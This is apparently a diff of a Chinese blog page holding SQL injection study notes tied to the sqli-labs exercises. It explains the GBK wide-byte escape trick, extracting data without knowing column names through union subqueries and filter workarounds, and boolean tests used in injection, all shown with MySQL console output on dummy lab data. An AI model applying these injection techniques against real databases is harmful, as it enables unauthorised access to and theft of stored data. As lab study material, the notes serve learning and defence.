 <p>其实原理和<code>URL编码</code>类似，在 GBK 编码中汉子占用2个字节，当服务端对传入的<code>单引号（&#39;）</code>添加转义符号时，会变成<code>\&#39;</code>。但是当我们传入<code>%df%27</code>时，服务器仍然会检测到单引号（%27），仍然会加上<code>反斜杠（%5c）</code>，传入<code>mysql服务器</code>的参数变成<code>%df%5c%27</code>，而 mysql服务器 会认为 %df%5c 为一体并翻译成汉子<code>運</code>，参数变成 <code>運 &#39;</code>，也就是单引号逃逸出来了，没有被转义掉</p>
 <p>例子可以看 <a href="[https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/](https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs 第31-40关/">sqli-labs Less25</a> )</p>
 <h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>具体参考： <a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">https://www.jianshu.com/p/6eba3370cfab</a></p>
 <p>无列名注入的知识点主要应用于只知道表名但不知道列名，但却要继续注入的情况</p>
 <p>日常查询</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>可以得到列名是 id、username、password。但是他们可以被替换掉（注意这里数字数量要和列数一样）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>然后可以从这个结果中选想要的对应列（any_alias 是一个别名，爱取什么名取什么名）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `3` from (select 1,2,3 union select * from users)any_alias;</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>注意到上面我们用到了(`)符号，但是当这个符号被过滤掉时，可以将其换成别名（alias_of_3 这里是 3 的别名）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select alias_of_3 from (select 1,2,3 as alias_of_3 union select * from users)any_alias;</span><br><span class="line">+------------+</span><br><span class="line">| alias_of_3 |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>如果返回的结果是多条，可以用<code>limit</code>将他们逐一返回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select a from (select 1,2,3 as a union select * from users limit 0,1)b;</span><br><span class="line">+---+</span><br><span class="line">| a |</span><br><span class="line">+---+</span><br><span class="line">| 3 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select a from (select 1,2,3 as a union select * from users limit 1,1)b;</span><br><span class="line">+------+</span><br><span class="line">| a    |</span><br><span class="line">+------+</span><br><span class="line">| Dumb |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select a from (select 1,2,3 as a union select * from users limit 2,1)b;</span><br><span class="line">+------------+</span><br><span class="line">| a          |</span><br><span class="line">+------------+</span><br><span class="line">| I-kill-you |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="布尔判断"><a href="#布尔判断" class="headerlink" title="布尔判断"></a>布尔判断</h2><p>注入中可能会用到布尔类型的判断</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1=1) &amp; (2=1)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0&gt;1) &amp; (2&gt;1)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1 between 0 and 2) &amp; (3 between 0 and 2)</span><br></pre></td></tr></table></figure>
+<pre><code>mysql&gt; select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
++----+----------+------------+
+3 rows in set (0.00 sec)
+</code></pre><p>可以得到列名是 id、username、password。但是他们可以被替换掉（注意这里数字数量要和列数一样）</p>
+<pre><code>mysql&gt; select 1,2,3 union select * from users;
++----+----------+------------+
+| 1  | 2        | 3          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
++----+----------+------------+
+4 rows in set (0.00 sec)
+</code></pre><p>然后可以从这个结果中选想要的对应列（any_alias 是一个别名，爱取什么名取什么名）</p>
+<pre><code>mysql&gt; select `3` from (select 1,2,3 union select * from users)any_alias;
++------------+
+| 3          |
++------------+
+| 3          |
+| Dumb       |
+| I-kill-you |
+| p@ssword   |
++------------+
+4 rows in set (0.00 sec)
+</code></pre><p>注意到上面我们用到了(`)符号，但是当这个符号被过滤掉时，可以将其换成别名（alias_of_3 这里是 3 的别名）</p>
+<pre><code>mysql&gt; select alias_of_3 from (select 1,2,3 as alias_of_3 union select * from users)any_alias;
++------------+
+| alias_of_3 |
++------------+
+| 3          |
+| Dumb       |
+| I-kill-you |
+| p@ssword   |
++------------+
+4 rows in set (0.00 sec)
+</code></pre><p>如果返回的结果是多条，可以用<code>limit</code>将他们逐一返回</p>
+<pre><code>mysql&gt; select a from (select 1,2,3 as a union select * from users limit 0,1)b;
++---+
+| a |
++---+
+| 3 |
++---+
+1 row in set (0.00 sec)
 
+mysql&gt; select a from (select 1,2,3 as a union select * from users limit 1,1)b;
++------+
+| a    |
++------+
+| Dumb |
++------+
+1 row in set (0.00 sec)
+
+mysql&gt; select a from (select 1,2,3 as a union select * from users limit 2,1)b;
++------------+
+| a          |
++------------+
+| I-kill-you |
++------------+
+1 row in set (0.00 sec)
+</code></pre><h2 id="布尔判断"><a href="#布尔判断" class="headerlink" title="布尔判断"></a>布尔判断</h2><p>注入中可能会用到布尔类型的判断</p>
+<pre><code>(1=1) &amp; (2=1)
+</code></pre><pre><code>(0&gt;1) &amp; (2&gt;1)
+</code></pre><pre><code>(1 between 0 and 2) &amp; (3 between 0 and 2)
+</code></pre>
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
                 data-autoplay="false">
